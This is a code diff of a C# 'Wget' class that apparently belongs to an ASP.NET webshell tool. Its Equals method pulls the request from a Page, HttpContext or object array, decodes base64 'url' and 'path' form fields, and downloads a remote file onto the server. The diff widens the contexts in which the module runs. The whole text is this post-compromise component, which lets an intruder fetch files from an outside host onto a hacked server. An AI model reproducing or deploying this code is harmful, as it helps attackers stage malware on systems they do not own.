@@ -17,9 +17,7 @@ public class Wget
 
     public override bool Equals(object obj)
     {
-        Page page = (Page) obj;
-        this.Response = page.Response;
-        this.Request = page.Request;
+        this.parseObj(obj);
         this.cs = "UTF-8";
         this.encoder = "base64";
         this.decoder = "";
@@ -32,7 +30,7 @@ public class Wget
         {
             String url = decode(this.Request.Form["url"]);
             String path = decode(this.Request.Form["path"]);
-            result += this.WgetCode(url,path);
+            result += this.WgetCode(url, path);
         }
         catch (Exception e)
         {
@@ -43,12 +41,37 @@ public class Wget
         return true;
     }
 
-    public String WgetCode(String url,String path)
+    public void parseObj(Object obj)
     {
-        HttpWebRequest RQ = (HttpWebRequest) WebRequest.Create(new Uri(url));
+        if (obj.GetType().IsArray)
+        {
+            Object[] data = (Object[])obj;
+            this.Request = (HttpRequest)data[0];
+            this.Response = (HttpResponse)data[1];
+        }
+        else
+        {
+            try
+            {
+                Page page = (Page)obj;
+                this.Response = page.Response;
+                this.Request = page.Request;
+            }
+            catch (Exception)
+            {
+                HttpContext context = (HttpContext)obj;
+                this.Response = context.Response;
+                this.Request = context.Request;
+            }
+        }
+    }
+
+    public String WgetCode(String url, String path)
+    {
+        HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(url));
         RQ.Method = "GET";
         RQ.ContentType = "application/x-www-form-urlencoded";
-        HttpWebResponse WB = (HttpWebResponse) RQ.GetResponse();
+        HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
         Stream WF = WB.GetResponseStream();
         FileStream FS = new FileStream(path, FileMode.Create, FileAccess.Write);
         int i;
